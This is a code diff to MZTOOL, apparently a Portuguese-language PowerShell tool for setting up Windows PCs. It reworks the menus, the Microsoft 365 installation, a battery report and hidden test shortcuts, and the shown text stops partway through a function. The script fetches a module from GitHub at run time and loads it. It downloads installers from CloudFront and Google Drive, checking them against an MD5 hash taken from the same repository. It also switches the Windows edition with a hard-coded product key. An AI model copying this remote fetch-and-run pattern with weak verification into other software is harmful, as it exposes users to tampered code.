@@ -47,6 +47,7 @@ $Global:WINVER = (Get-CimInstance Win32_OperatingSystem).Caption, (Get-CimInstan
 $Global:PSVER = { $PSVersionTable.PSVersion }
 $Global:MZPSVER = "5.1.0"
 $Global:SCRIPTCODE = $MyInvocation.MyCommand.Definition
+$Global:CLOUDFRONT = "https://d15d16xpb69uci.cloudfront.net"
 
 $Global:ENVIROMENTVARS = @{
     'TOOL'                 = "C:\MZTOOL"
@@ -168,6 +169,7 @@ function RESTARTADMIN {
         $RESTARTPWSH.Verb = 'runas'
         [System.Diagnostics.Process]::Start($RESTARTPWSH) | Out-Null         
         EXIT
+
     }
     else { Remove-Item $RESTARTFILE -Force -ErrorAction SilentlyContinue }
     
@@ -1126,7 +1128,9 @@ function MZTOOLMODULE {
     if (Test-Path -Path $Global:MZTOOLMODULEPATH) {
         Remove-Item -Path $Global:MZTOOLMODULEPATH -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
     }
-    try { Invoke-RestMethod https://raw.githubusercontent.com/DanielMozartt/MZTOOL/refs/heads/MZTOOL/MODULES/MZTOOL.psm1 | Out-File -FilePath $Global:MZTOOLMODULEPATH -Encoding UTF8 }
+    try { 
+        Invoke-RestMethod https://raw.githubusercontent.com/DanielMozartt/MZTOOL/refs/heads/BETA/MODULES/MZTOOL.psm1 | Out-File -FilePath $Global:MZTOOLMODULEPATH -Encoding UTF8 
+    }
     catch {        
         # Grava o conteúdo no arquivo .psm1 (sobrescrevendo, se necessário)
         Set-Content -Path $Global:MZTOOLMODULEPATH -Value $Global:MODULECONTENT -Force
@@ -1151,9 +1155,7 @@ do {
  
     # Verifica se o módulo foi carregado com sucesso.
     if ($Global:MZTOOLMODULE -and $Global:MZTOOLMODULETRUE) {
-
         $MODULESTATUS = "MÓDULO ON"
-
     }
 
     else {     
@@ -1161,7 +1163,7 @@ do {
         Write-Host ($MODULESTATUS = "MÓDULO OFF") -ForegroundColor Yellow
         $TRYGETMODULE++      
         
-        #Se o número de tentativas for maior ou igual a 5, encerra o MZTOOL.
+        #Se o número de tentativas for maior ou igual a 5, tenta o método Perfil PowerShell.
         if ($TRYGETMODULE -ge 5) {
 
             Write-Host "`n`nTentativas de carregamento do módulo MZTOOL esgotadas.`n`nTENTANDO PROFILE POWERSHELL" -ForegroundColor Red
@@ -1344,24 +1346,26 @@ ________________________________________________________
 |                                                      | 
 |                                                      |
 | |1| IMPLEMENTAÇÃO COMPLETA                           |
-| |2| DIAGNÓSTICO DE HARDWARE E SISTEMA                |
-| |3| IMPLEMENTAR WINGET & WINDOWS UPDATE              |
-| |4| IMPLEMENTAR OFFICE                               |
+| |2| FERRAMENTAS                                      |
+| |3| WINGET & WINDOWS UPDATE                          |
+| |4| MICROSOFT 365 & OFFICE                           |
 | |0| SAIR                                             |
 |                                                      |
 |                   MOZART INFORMÁTICA | DANIEL MOZART |
 |______________________________________________________|
 '
+    Write-Host "💾"-NoNewline
     if (& $Global:PROFILESTATUS) { 
         . $PROFILE | Out-Null 
     }
+
     # Informa se o Módulo ou o Perfil Powershell está importado.
-    if ($Global:PROFILELOADEDTRUE) { Write-Host "MODO PERFIL POWERSHELL" -ForegroundColor Green }
+    if ($Global:PROFILELOADEDTRUE) { 
+        Write-Host "MODO PERFIL POWERSHELL" -ForegroundColor Green 
+    }
 
     elseif ($Global:MZTOOLMODULE -and $Global:MZTOOLMODULETRUE) { 
-
-        Write-Host "$MODULESTATUS $(if ($Global:GIT) { "- GIT" } else { "- PS1" })" -ForegroundColor $(if ($Global:MZTOOLMODULE -and $Global:MZTOOLMODULETRUE) { 'Green' } else { 'Red' })
-    
+        Write-Host "$MODULESTATUS $(if ($Global:GIT) { "- GIT VERSION" } else { "- PS1 VERSION" })" -ForegroundColor $(if ($Global:MZTOOLMODULE -and $Global:MZTOOLMODULETRUE) { 'Green' } else { 'Red' })
     }
 
     else { Write-Host "MÓDULO E PERFIL POWERSHELL OFFLINE" -ForegroundColor Red }
@@ -1395,19 +1399,29 @@ _______________________________________________________
 |                  MOZART INFORMÁTICA | DANIEL MOZART |
 |_____________________________________________________|
 '
-            $DEPLOYFUNCTION = @(
+            # Executa o conjunto de funções com os devidos parâmetros especificados.
+            $DEPLOYFUNCTION1 = @(
                 @{ Functions = 'PERFILTHEME' },
                 @{ Functions = 'ANYDESK' },
                 @{ Functions = 'WINGETMODULE'; Wait = $true },
-                @{ Functions = 'WINUPDATEMODULE', 'REMOVEGHOSTDRIVERS', 'WINUPDATE' },
+                @{ Functions = 'WINUPDATEMODULE', 'REMOVEGHOSTDRIVERS', 'WINUPDATE' }
+            )       
+            
+            DEPLOYFUNCTION -DEPLOYFUNCTION $DEPLOYFUNCTION1 <#-HIDDENALL#> 
+
+            $DEPLOYFUNCTION2 = @(
                 @{ Functions = 'WINGETAPPS', 'WINGETUPGRADE' },
-                @{ Functions = 'MICROSOFT365'; Wait = $true },
+                @{ Functions = 'MICROSOFT365'; Wait = $true }                
+            )
+
+            DEPLOYFUNCTION -DEPLOYFUNCTION $DEPLOYFUNCTION2 -WAITALL <#-HIDDENALL#> 
+
+            $DEPLOYFUNCTION3 = @(
                 @{ Functions = 'PINICONS', 'STARTSOFTWARES' }
             )
-       
-            # Executa o conjunto de funções com os devidos parâmetros especificados.
-            DEPLOYFUNCTION -BarWidth 30 -LinePosition 17 -DEPLOYFUNCTIONHASH $DEPLOYFUNCTION -HIDDENALL   
-            
+
+            DEPLOYFUNCTION -DEPLOYFUNCTION $DEPLOYFUNCTION3 <#-HIDDENALL#>
+
             Clear-Host
             Write-Host '
 _______________________________________________________
@@ -1430,16 +1444,39 @@ _______________________________________________________
             DISPLAYMENU
             
         }
-       
-        #OPÇÃO 2 - DIAGNÓSTICO DE HARDWARE E SISTEMA.
+
+        #OPÇÃO 2 - FERRAMENTAS.
         2 {
-            #Verifica se há conexão com internet.
-            INTERNET
+            function DISPLAYMENU1B {
+                Clear-Host
+                Write-Host '
+________________________________________________________
+|                                                      |
+|                        MZTOOL                        |
+| ____________________________________________________ | 
+|                                                      | 
+|                                                      |
+| |1| DIAGNÓSTICO DE HARDWARE E SISTEMA                |
+| |2| VERIFICAÇÃO DE SISTEMA (SFC SCANNOW)             |
+| |3| STATUS DA BATERIA                                |
+| |4| CONVERSÃO PARA WINDOWS PRO                       |
+| |5| VOLTAR                                           |
+| |0| SAIR                                             |
+|                                                      |
+|                   MOZART INFORMÁTICA | DANIEL MOZART |
+|______________________________________________________|
+'
+                $CHOICE = Read-Host 'INSIRA O NÚMERO CORRESPONDENTE A OPÇÃO DESEJADA'            
+                Switch ($CHOICE) {
+                    #OPÇÃO 2 - DIAGNÓSTICO DE HARDWARE E SISTEMA.
+                    1 {
+                        #Verifica se há conexão com internet.
+                        INTERNET
             
-            $Host.UI.RawUI.WindowTitle = "$Global:TITLE> TOOL"    
+                        $Host.UI.RawUI.WindowTitle = "$Global:TITLE> TOOL"    
                
-            Clear-Host
-            Write-Host '
+                        Clear-Host
+                        Write-Host '
 _______________________________________________________
 |                                                     |
 |                       MZTOOL                        |
@@ -1455,14 +1492,14 @@ _______________________________________________________
 |                  MOZART INFORMÁTICA | DANIEL MOZART |
 |_____________________________________________________|
 '                               
-            DOWNLOADMZTOOL            
+                        DOWNLOADMZTOOL            
           
-            function DISPLAYMENU2 {
+                        function DISPLAYMENU2 {
                 
-                $Host.UI.RawUI.WindowTitle = "$Global:TITLE> TOOL"
+                            $Host.UI.RawUI.WindowTitle = "$Global:TITLE> TOOL"
 
-                Clear-Host
-                Write-Host '
+                            Clear-Host
+                            Write-Host '
 _______________________________________________________
 |                                                     |
 |                       MZTOOL                        |
@@ -1479,42 +1516,94 @@ _______________________________________________________
 |_____________________________________________________|
 '         
 
-                $CHOICE = Read-Host 'INSIRA O NÚMERO CORRESPONDENTE A OPÇÃO DESEJADA'
+                            $CHOICE = Read-Host 'INSIRA O NÚMERO CORRESPONDENTE A OPÇÃO DESEJADA'
              
-                Switch ($CHOICE) {
+                            Switch ($CHOICE) {
 
-                    1 {
-                        DIAGNOSTICS -START
+                                1 {
+                                    DIAGNOSTICS -START
                                                     
-                        DISPLAYMENU2
-                    }
+                                    DISPLAYMENU2
+                                }
                     
-                    2 {                     
-                        DIAGNOSTICS -STOP                                            
+                                2 {                     
+                                    DIAGNOSTICS -STOP                                            
 
+                                    DISPLAYMENU2
+                                }
+
+                                3 {
+                                    DIAGNOSTICS -STOP 
+
+                                    DISPLAYMENU
+                                }
+
+                                0 { 
+                                    DIAGNOSTICS -STOP
+
+                                    EXITMZTOOL
+                                }
+
+                                default {
+                                    ENTRYERROR
+                                }
+
+                            }
+                        }
+                
                         DISPLAYMENU2
+
+                    }
+
+                    2 {
+                        Clear-Host
+                        Write-Host '
+_______________________________________________________
+|                                                     |
+|                       MZTOOL                        |
+| __________________________________________________  | 
+|                                                     |
+|             FERRAMENTAS DE DIAGNÓSTICOS             |
+|                                                     |
+|                                                     |
+|         VERIFICAÇÃO DE SISTEMA EM ANDAMENTO         |
+|                                                     |
+|                                                     |
+|                                                     |
+|                  MOZART INFORMÁTICA | DANIEL MOZART |
+|_____________________________________________________|
+'
+                        NEWPWSH -Functions 'IMGHEALTH', 'CLEANTEMP' -Wait
+
+                        DISPLAYMENU1B
                     }
 
                     3 {
-                        DIAGNOSTICS -STOP 
+                        BATTERYREPORT
+                        DISPLAYMENU1B
+                    }
 
+                    4 {
+                        NEWPWSH -Functions 'PRO'
+                        EXITMZTOOL
+                    }
+
+                    5 { 
                         DISPLAYMENU
                     }
 
-                    0 { 
-                        DIAGNOSTICS -STOP
+                    0 {  
                         EXITMZTOOL
                     }
 
                     default {
                         ENTRYERROR
                     }
-
                 }
-            }
                 
-            DISPLAYMENU2
+            }
 
+            DISPLAYMENU1B 
         }
 
         3 {
@@ -1560,11 +1649,11 @@ _______________________________________________________
 |                  MOZART INFORMÁTICA | DANIEL MOZART |
 |_____________________________________________________|
 '
-                        $Null = @(                             
-                            NEWPWSH -Functions 'WINGETMODULE' -ReturnProcess -Hidden
-                            NEWPWSH -Functions 'WINUPDATEMODULE' -ReturnProcess -Hidden
-                        ) | Where-Object { $_.Id -gt 0 } | ForEach-Object { Wait-Process -Id $_.Id }         
-         
+                        @(                             
+                            NEWPWSH -Functions 'WINGETMODULE' -ReturnProcess #-Hidden
+                            NEWPWSH -Functions 'WINUPDATEMODULE' -ReturnProcess #-Hidden
+                        ) | Where-Object { $_.Id -gt 0 } | ForEach-Object { Wait-Process -Id $_.Id -ErrorAction SilentlyContinue }         
+                      
                         CLEANTEMP
 
                         DISPLAYMENU3
@@ -1592,11 +1681,11 @@ _______________________________________________________
 |                  MOZART INFORMÁTICA | DANIEL MOZART |
 |_____________________________________________________|
 ' 
-                        $Null = @(
-                            NEWPWSH -Functions 'WINGETUPGRADE' -ReturnProcess -Hidden
-                            NEWPWSH -Functions 'REMOVEGHOSTDRIVERS', 'WINUPDATE' -ReturnProcess -Hidden
-                        ) | Where-Object { $_.Id -gt 0 } | ForEach-Object { Wait-Process -Id $_.Id } 
-
+                        @(
+                            NEWPWSH -Functions 'WINGETUPGRADE' -ReturnProcess #-Hidden
+                            NEWPWSH -Functions 'REMOVEGHOSTDRIVERS', 'WINUPDATE' -ReturnProcess #-Hidden
+                        ) | Where-Object { $_.Id -gt 0 } | ForEach-Object { Wait-Process -Id $_.Id -ErrorAction SilentlyContinue } 
+                                        
                         CLEANTEMP
                                     
                         DISPLAYMENU3
@@ -1673,11 +1762,11 @@ _______________________________________________________
 |                  MOZART INFORMÁTICA | DANIEL MOZART |
 |_____________________________________________________|
 '    
-                                        
-                        $365STATUS = MICROSOFT365    
-                       
-                        DISPLAYMENU365STATUS -365STATUS $365STATUS    
-                   
+                        
+                        $M365STATUS = MICROSOFT365 | Select-Object -Last 1                       
+                     
+                        DISPLAYMENUM365STATUS -M365STATUS $M365STATUS                           
+                                     
                         CLEANTEMP
              
                         DISPLAYMENU 
@@ -1719,8 +1808,7 @@ _______________________________________________________
                         EXITMZTOOL
                     }
 
-                    default {
-                                             
+                    default {                                             
                         ENTRYERROR
                     }
                 }
@@ -1734,13 +1822,89 @@ _______________________________________________________
             
             EXITMZTOOL         
             
-        }                  
+        }
+       
+        # COMANDOS DE TESTE OCULTOS DO MENU.
+        
+        #Testa a função ANYDESK.
+        any {
 
-        default {
+            NEWPWSH -Functions 'ANYDESK' 
+            DISPLAYMENU
 
-            ENTRYERROR
+        }    
+
+        #Testa a função WINGETAPPS.
+        w {
+            
+            NEWPWSH -Functions 'WINGETAPPS' -Wait
+            DISPLAYMENU
+
         }
 
+        #Testa a função WINUPDATE.
+        u {
+
+            NEWPWSH -Functions 'WINUPDATEMODULE', 'WINUPDATE' -Wait
+            DISPLAYMENU
+
+        }
+        
+        #Testa a função CLOCKDATE.
+        h {
+
+            NEWPWSH -Functions 'CLOCKDATE'
+            DISPLAYMENU
+
+        }
+
+        #Testa a função PRO.
+        p {
+
+            NEWPWSH -Functions 'PRO' 
+            DISPLAYMENU
+
+        }
+
+        #Testa a função IMGHEALTH.
+        sfc {
+
+            NEWPWSH -Functions 'IMGHEALTH', 'CLEANTEMP'             
+            DISPLAYMENU
+
+        }
+
+        #Testa a função DRIVERBOOSTER.
+        db {
+
+            DOWNLOADMZTOOL
+            NEWPWSH -Functions 'DRIVERBOOSTER'
+            DISPLAYMENU
+
+        }
+
+        #Testa a função BATTERYREPORT.
+        battery { 
+
+            BATTERYREPORT
+            DISPLAYMENU
+
+        }
+
+        amdulps {
+
+            AMDULPS -Verbose
+            DISPLAYMENU
+        
+        }
+
+        awin {
+            awin exit
+        }
+
+        default {
+            ENTRYERROR
+        }
     }
 }
 
@@ -1787,20 +1951,14 @@ _______________________________________________________
     } while ($true)
 }
 
-function DISPLAYMENU365STATUS {
-    param(
-        [switch]$365STATUS 
+function DISPLAYMENUM365STATUS {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory)]
+        [int]$M365STATUS 
     ) 
-
-    if ($365STATUS -eq "1") {
-
-        Write-Warning "MICROSOFT 365 INSTALADO COM SUCESSO."    
-        Start-Sleep -Seconds 5
-        Start-Process PowerShell -WindowStyle Hidden { Start-Process WINWORD }
-
-    }
-
-    if ($365STATUS -eq "2" -or -not($365STATUS)) {
+  
+    function M365ERROR {
         
         Clear-Host
         Write-Host '
@@ -1813,40 +1971,21 @@ _______________________________________________________
 |        SERVIÇO DE INSTALAÇÃO INDISPONÍVEL           |
 |                                                     |
 |   |1| TENTAR NOVAMENTE                              |
-|   |2| IGNORAR & CONTINUAR                           |
-|   |3| VOLTAR AO MENU                                |
+|   |2| VOLTAR AO MENU                                |
 |   |0| SAIR                                          |
+|                                                     |
 |                  MOZART INFORMÁTICA | DANIEL MOZART |
 |_____________________________________________________|  
-' 
-        Write-Host "INSIRA O NÚMERO CORRESPONDENTE À OPÇÃO DESEJADA:"
-           
-        $timeoutEmSegundos = 10
-            
-        $cronometro = [System.Diagnostics.Stopwatch]::StartNew()
-        while (-not [System.Console]::KeyAvailable -and ($cronometro.Elapsed.TotalSeconds -lt $timeoutEmSegundos)) {
-            Start-Sleep -Milliseconds 100
-        }
-
-        if ([System.Console]::KeyAvailable) {
-            # Se uma tecla estiver disponível, lê a linha (o que o usuário digitou)
-            $CHOICE = [System.Console]::ReadLine().Trim()
-        }
-        else {
-            # Se o tempo expirar sem entrada, seta a opção para 2
-            $CHOICE = 2
-               
-        }
+'         
+        $CHOICE = Read-Host "INSIRA O NÚMERO CORRESPONDENTE À OPÇÃO DESEJADA"
+  
         switch ($CHOICE) {
             1 {
                 $WINGETAVAILABLE = Get-Command winget -ErrorAction SilentlyContinue
                 if (-not ($WINGETAVAILABLE)) { WINGETMODULE }
                 DISPLAYMENU4 -CHOICE4 "1"
-            }
+            }         
             2 {
-                #SCRIPT CONTINUA.
-            }
-            3 {
                 DISPLAYMENU                     
             }
             0 {
@@ -1857,15 +1996,37 @@ _______________________________________________________
             } 
         }  
     }  
-    
-    if ($365STATUS -eq "3") {
 
-        Write-Warning "ENCONTRADA(S) UMA OU MAIS VERSÃO(S) DO MICROSOFT 365 OU OFFICE JÁ INSTALADO(S).`n`nDESINSTALE A(S) VERSÃO(S) JÁ INSTALADA(S)`n`n"    
-        Start-Sleep -Seconds 5
+    switch ($M365STATUS) {
+        1 {
+
+            Write-Host "MICROSOFT 365 INSTALADO COM SUCESSO."    
+            Start-Sleep -Seconds 5
+            Start-Process WINWORD 
+
+        }
+
+        2 { 
+
+            M365ERROR
         
-    } 
+        }    
     
+        3 {
 
+            Write-Warning "ENCONTRADA(S) UMA OU MAIS VERSÃO(S) DO MICROSOFT 365 OU OFFICE JÁ INSTALADO(S).`n`nDESINSTALE A(S) VERSÃO(S) JÁ INSTALADA(S)`n`n"    
+            Start-Sleep -Seconds 5
+        
+        } 
+        
+        default { 
+
+            M365ERROR
+        
+        }
+
+    }
+    
 }
 
 function ENTRYERROR {
@@ -1943,11 +2104,14 @@ function DOWNLOADMZTOOL {
 
     $MZTOOLZIP = "$Env:TOOL\MZTOOL.zip"
 
-    $MZTOOLZIPHASH1 = "465B09A547F5FAA30B7CDD1B49126185"
+    $MZTOOLZIPJSON = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/DanielMozartt/MZTOOL/refs/heads/BETA/TERRAFORM/UPLOADFILE/terraform-outputs.json"
+
+    $MZTOOLZIPHASH1 = $MZTOOLZIPJSON.mztool_zip_md5.value
+    #$MZTOOLZIPHASH1 = "2DD189FA98F7AF9D8C8210D706FF7C62"
     $MZTOOLZIPHASH2 = "15795A668435FA4A6F81A6E9BFB4DEEB"
     $MZTOOLZIPHASH = @("$MZTOOLZIPHASH1", "$MZTOOLZIPHASH2")
 
-    $MZTOOLAWS = 'https://d15d16xpb69uci.cloudfront.net/MZTOOL.zip'      
+    $MZTOOLAWS = "$Global:CLOUDFRONT/MZTOOL.zip"      
     $MZTOOLGOOGLEDRIVE = 'https://drive.usercontent.google.com/download?id=19eiKJbx55RgkV_KczFrkL7uMkxjVrMo9&confirm=yy'
     
     TOOLDIR
@@ -1964,14 +2128,13 @@ function DOWNLOADMZTOOL {
         DOWNLOAD -Urls $DRIVEURLS -Destination $MZTOOLZIP -BarWidth 30
               
         $NEWMZTOOLZIPHASH = Get-FileHash -Path $MZTOOLZIP -Algorithm MD5 -ErrorAction SilentlyContinue
-    
+       
         $TRYGETMZTOOLZIP++   
         
-        if ($TRYGETMZTOOLZIP -ge 3) {
-            $MZTOOLAWS = 'HTTPS://NULL.NULL'           
-            $DRIVEURLS = @($MZTOOLAWS, $MZTOOLGOOGLEDRIVE)              
+        if (($NEWMZTOOLZIPHASH.Hash -notin $MZTOOLZIPHASH) -or ($TRYGETMZTOOLZIP -ge 3)) {                              
+            $DRIVEURLS = @($MZTOOLGOOGLEDRIVE)              
         }
-            
+ 
         #Se o número de tentativas for maior ou igual a 5, encerra o MZTOOL.
         if ($TRYGETMZTOOLZIP -ge 5) {
     
@@ -1988,7 +2151,7 @@ function DOWNLOADMZTOOL {
     RESETCURSOR 
 
     $MZTOOLZIPHASH | Where-Object { $_ -eq $NEWMZTOOLZIPHASH.Hash } | ForEach-Object {
-        Write-Host "ORIGIN HASH $($_)`nACTUAL HASH $($NEWMZTOOLZIPHASH.Hash)" -NoNewline -ForegroundColor Green
+        Write-Host "HASH OK $($_)" -NoNewline -ForegroundColor Green
     }     
 
     Start-Sleep -Seconds 3
@@ -2009,8 +2172,7 @@ function DOWNLOADMZTOOL {
 }
 
 function DIAGNOSTICS {
-    param(
-        #[Parameter(Mandatory = $true)]
+    param(      
         [Switch]$START,
         [Switch]$STOP
     )  
@@ -2329,6 +2491,8 @@ function ANYDESK {
 }
 
 function MICROSOFT365 {
+    #[CmdletBinding()]
+    #param()
     
     #Implementação do Microsoft Office 365.
     
@@ -2336,35 +2500,55 @@ function MICROSOFT365 {
     
     #Verifica se o Microsoft 365 já está instalado.
     $MS365 = { Get-Command "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" -ErrorAction SilentlyContinue }
-    
-    $INSTALLED = UNINSTALLOFFICE
-    
+      
+    $INSTALLED = UNINSTALLOFFICE    
+       
     if (-not ($INSTALLED)) {             
         
         #Cria o arquivo XML de instalação personalizada no diretório %TEMP%.
         [xml]$XML = @'
-<Configuration ID="c53a84ef-bc97-461f-a0fe-9211c1ef6ee3">
-  <Add OfficeClientEdition="64" Channel="Current">
-    <Product ID="O365ProPlusEEANoTeamsRetail">
+<Configuration ID="b498f2f1-0144-4998-8873-909801e7e0b3">
+  <Add OfficeClientEdition="64" Channel="Current" MigrateArch="TRUE">
+    <Product ID="O365BusinessEEANoTeamsRetail">
       <Language ID="pt-br" />
       <ExcludeApp ID="Access" />
       <ExcludeApp ID="Groove" />
       <ExcludeApp ID="Lync" />
+      <ExcludeApp ID="OneDrive" />
       <ExcludeApp ID="OneNote" />
       <ExcludeApp ID="Publisher" />
-      <ExcludeApp ID="Bing" />
     </Product>
   </Add>
+  <Property Name="SharedComputerLicensing" Value="0" />
+  <Property Name="FORCEAPPSHUTDOWN" Value="TRUE" />
+  <Property Name="DeviceBasedLicensing" Value="0" />
+  <Property Name="SCLCacheOverride" Value="0" />
   <Updates Enabled="TRUE" />
-  <AppSettings>
-    <User Key="software\microsoft\office\16.0\excel\options" Name="defaultformat" Value="51" Type="REG_DWORD" App="excel16" Id="L_SaveExcelfilesas" />
-    <User Key="software\microsoft\office\16.0\powerpoint\options" Name="defaultformat" Value="27" Type="REG_DWORD" App="ppt16" Id="L_SavePowerPointfilesas" />
-    <User Key="software\microsoft\office\16.0\word\options" Name="defaultformat" Value="" Type="REG_SZ" App="word16" Id="L_SaveWordfilesas" />
-    <User Key="software\microsoft\office\16.0\word\options" Name="verticalruler" Value="1" Type="REG_DWORD" App="word16" Id="L_VerticalrulerPrintviewonly" />
-  </AppSettings>
-  <Display Level="FALSE" AcceptEULA="TRUE" />
+  <RemoveMSI />
 </Configuration> 
-'@           
+'@        
+        
+        function POSTINSTALLM365 {
+
+            if (& $MS365) {
+
+                #Implementa os atalhos dos aplicativos Word, Excel e PowePoint na área de trabalho pública.
+                $365LNK = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs"
+                @("Word.lnk", "Excel.lnk", "PowerPoint.lnk") | ForEach-Object { Copy-Item "$365LNK\$_" "$Global:DESKTOP" -ErrorAction SilentlyContinue }
+
+                Stop-Process -Name OfficeC2RClient -Force -ErrorAction SilentlyContinue
+
+                $M365STATUS = 1 
+
+            }
+            else { 
+
+                $M365STATUS = 2 
+            
+            }
+            
+            return $M365STATUS
+        }  
 
         $365XML = "$env:Temp\MICROSOFT365.xml"
 
@@ -2376,16 +2560,23 @@ function MICROSOFT365 {
         if ($WINGETAVAILABLE -and !($WINGETRUNNING) -and !(& $MS365)) {      
         
             Winget Install --Id Microsoft.Office --Override "/configure $365XML" --Accept-Source-Agreements --Accept-Package-Agreements --Silent
+        
+            POSTINSTALLM365
+
+            $M365STATUS = 1 
+        
         }
 
         elseif ($WINGETRUNNING -and !(& $MS365)) {
 
             #Caso o Winget não esteja disponível, baixa o Microsoft 365 de forma alternativa.
-        
-            $365URL1 = "https://officecdn.microsoft.com/pr/wsus/setup.exe"
-            $365URL2 = "https://go.microsoft.com/fwlink/?linkid=2264705&clcid=0x409&culture=pt-br&country=br"
-        
-            $365URLS = @($365URL1, $365URL2)
+           
+            $365URLS = @(
+                "https://officecdn.microsoft.com/pr/wsus/setup.exe",
+                "https://go.microsoft.com/fwlink/?linkid=2264705&clcid=0x409&culture=pt-br&country=br",
+                "$Global:CLOUDFRONT/MICROSOFT365.exe"            
+            )
+            
             $365EXE = "$env:TEMP\MICROSOFT365.exe"
 
             DOWNLOAD -Urls $365URLS -Destination $365EXE -BarWidth 30
@@ -2393,29 +2584,26 @@ function MICROSOFT365 {
             if (Test-Path -Path $365EXE -ErrorAction SilentlyContinue) {        
                 Start-Process -FilePath $365EXE -ArgumentList "/configure $365XML" -Wait
             }
-     
+            
+            POSTINSTALLM365
+            
+            $M365STATUS = 1 
         }
 
         else {
-            $365STATUS = "2"            
+            $M365STATUS = 2                        
         }    
-    
-        #Implementa os atalhos dos aplicativos Word, Excel e PowePoint na área de trabalho pública.
-        $365LNK = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs"
-        @("Word.lnk", "Excel.lnk", "PowerPoint.lnk") | ForEach-Object { Copy-Item "$365LNK\$_" "$Global:DESKTOP" -ErrorAction SilentlyContinue }
-    
-        Stop-Process -Name OfficeC2RClient -Force -ErrorAction SilentlyContinue
 
-        if (& $MS365) { $365STATUS = "1" }      
     }
     
     else {        
         
-        $365STATUS = "3"
+        $M365STATUS = 3
+        
     }   
 
-    return $365STATUS
-
+    return $M365STATUS
+    
 }   
 
 function OFFICE2007 {
@@ -2429,8 +2617,8 @@ function OFFICE2007 {
     $INSTALLED = UNINSTALLOFFICE
     if (-NOT ($INSTALLED)) {                  
        
-        $OFFICE2007AWS = 'https://d15d16xpb69uci.cloudfront.net/OFFICE2007.zip'
-        $OFFICE2007GOOGLEDRIVE = 'https://NULL.NULL'
+        $OFFICE2007AWS = "$Global:CLOUDFRONT/OFFICE2007.zip"
+        $OFFICE2007GOOGLEDRIVE = $OFFICE2007AWS
 
         $OFFICE2007ZIP = "$env:TOOL\OFFICE\OFFICE2007.zip"
         $OFFICE2007FOLDER = "$env:TOOL\OFFICE\2007"
@@ -2472,8 +2660,8 @@ function OFFICE2007 {
                 }
             
             } while (
-            (-not (Test-Path -Path $OFFICE2007ZIP -ErrorAction SilentlyContinue)) -or 
-            ($NEWOFFICE2007HASH.Hash -ne $OFFICE2007HASH)
+                (-not (Test-Path -Path $OFFICE2007ZIP -ErrorAction SilentlyContinue)) -or 
+                ($NEWOFFICE2007HASH.Hash -ne $OFFICE2007HASH)
             )
 
             RESETCURSOR
@@ -2933,12 +3121,12 @@ function STARTSOFTWARES {
     Start-Sleep 5
 
     #Mostra e atualiza a Área de Trabalho.
-    DESKTOPUPDATE 
-    
+    DESKTOPUPDATE
+
     Start-Process WINWORD
     Start-Process ACROBAT
-    Start-Process CHROME https://github.com/DanielMozartt/MZTOOL, https://www.youtube.com/mozartinformatica, https://www.instagram.com/mozartinformatica/    
-     
+    Start-Process CHROME https://github.com/DanielMozartt/MZTOOL, https://www.youtube.com/mozartinformatica, https://www.mozartinformatica.com, https://www.instagram.com/mozartinformatica/    
+ 
 }
 
 function IMGHEALTH {
@@ -2976,8 +3164,127 @@ function PRO {
         changepk.exe /ProductKey VK7JG-NPHTM-C97JM-9MPGT-3V66T    
     }
 
-    Clear-Host
+}
+<#
+function BATTERYREPORT {
 
+    $Global:MZTOOLAPPDATA = if ($MZTOOLAPPDATA) { $MZTOOLAPPDATA } else { "$env:APPDATA\MZTOOL" }
+
+    if (-not (Test-Path $MZTOOLAPPDATA)) {
+        New-Item -Path $MZTOOLAPPDATA -ItemType Directory -Force | Out-Null > $null 2>&1          
+    }
+
+    $BATTERYREPORT = Join-Path $Global:MZTOOLAPPDATA "BATTERYREPORT.html"
+    
+    powercfg /batteryreport /output "$BATTERYREPORT" | Out-Null
+    
+    if (Test-Path $BATTERYREPORT -ErrorAction SilentlyContinue) {
+        
+        Start-Process $BATTERYREPORT
+        
+        $CYCLELINE = Select-String -Path $BATTERYREPORT -Pattern 'Cycle Count' |
+        Select-Object -First 1 -ExpandProperty Line
+      
+        $CYCLES = $null
+        if ($CYCLELINE -match '>\s*(\d+)\s*<') {
+            $CYCLES = [int]$Matches[1]
+        }
+
+        if ($CYCLES -gt 500) {
+            Write-Host "🪫 Bateria já passou de 500 ciclos. Ciclos atuais: $CYCLES." -ForegroundColor Yellow
+        }
+        elseif ($CYCLES -gt 0 -and $CYCLES -lt 500) {
+            Write-Host "🔋 Bateria saudável, ciclos atuais: $CYCLES." -ForegroundColor Green
+        }
+        else {
+            Write-Host "⚠️ Falha ao ler o número de ciclos no relatório." -ForegroundColor Yellow
+        }        
+    }
+
+    else {
+        Write-Host "⚠️ Não foi possível gerar o relatório de bateria." -ForegroundColor Red
+    }
+
+    Read-Host "`nPRESSIONE ENTER PARA CONTINUAR"
+
+}
+#>
+function BATTERYREPORT {
+    <#
+    $Global:MZTOOLAPPDATA = if ($MZTOOLAPPDATA) { $MZTOOLAPPDATA } else { "$env:APPDATA\MZTOOL" }
+
+    if (-not (Test-Path $Global:MZTOOLAPPDATA)) {
+        New-Item -Path $Global:MZTOOLAPPDATA -ItemType Directory -Force | Out-Null
+    }#>
+
+    $BATTERYREPORT = Join-Path $Global:MZTOOLAPPDATA 'BATTERYREPORT.html'
+    powercfg /batteryreport /output "$BATTERYREPORT" | Out-Null
+
+    if (Test-Path $BATTERYREPORT) {
+
+        Start-Process $BATTERYREPORT
+
+        $cycleLine = Select-String -Path $BATTERYREPORT -Pattern 'Cycle Count'          | Select-Object -First 1 -ExpandProperty Line
+        $designLine = Select-String -Path $BATTERYREPORT -Pattern 'Design Capacity'     | Select-Object -First 1 -ExpandProperty Line
+        $fullLine = Select-String -Path $BATTERYREPORT -Pattern 'Full Charge Capacity'  | Select-Object -First 1 -ExpandProperty Line
+
+        $CYCLES = if ($cycleLine -match '>\s*(\d+)\s*<') { [int]$Matches[1] } else { $null }
+        $DESIGN = if ($designLine -match '>\s*(\d+)\s*<') { [double]$Matches[1] } else { $null }
+        $FULL = if ($fullLine -match '>([^<]+)<') {
+            [double]($Matches[1] -replace '[^\d]', '')
+        }
+        else { $null }
+
+        if ($FULL -and $DESIGN -and $DESIGN -ne 0) {
+            $STATE = [math]::Round(($FULL / $DESIGN) * 100, 2)
+            Write-Host "Estado da bateria: $STATE % da capacidade original." -ForegroundColor Cyan
+        }
+        else {
